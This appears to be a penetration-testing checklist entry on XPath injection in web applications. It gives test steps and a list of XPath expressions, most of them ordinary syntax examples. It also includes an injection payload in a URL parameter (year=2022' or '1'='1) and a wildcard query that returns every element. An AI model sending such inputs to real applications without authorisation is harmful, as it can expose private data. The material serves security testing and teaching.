## Use case

The application allows user input to construct XPath queries, which can lead to XPath Injection vulnerabilities. This is critical as it may allow attackers to extract sensitive data from XML databases.

## Steps to test

1. Identify a feature that accepts user input for XML queries, such as a search or filter function.
2. Input a crafted XPath query that includes a wildcard or predicate, such as '//*' or '/bookstore/book[@year > 2022]'.
3. Observe the application's response for any unexpected data exposure or errors.
4. Test various XPath expressions to manipulate the query and extract additional data, such as '/bookstore/book/title/text()'.

## Commands

```text
GET https://example.com/search?query=//*
GET https://example.com/filter?year=2022' or '1'='1
## Selecting Elements:
# All book elements
/bookstore/book
# The first author within a book
/bookstore/book[1]/author
## Using Wildcards:
# All elements in the document
//*
# All title elements at any level
//title
## Predicates for Filtering:
# Book elements published after 2022
/bookstore/book[@year > 2022]
# The second chapter within a book
/bookstore/book/chapter[2]
## Navigating Axes:
# The parent book of a chapter element
/bookstore/book/chapter/..
# All preceding paragraph elements before the current paragraph
preceding-sibling::paragraph
## Conditional Selection:
# Book elements with a price less than $40
/bookstore/book[price < 40]
## Text Content Selection:
# The text content of a title element
/bookstore/book/title/text()
```
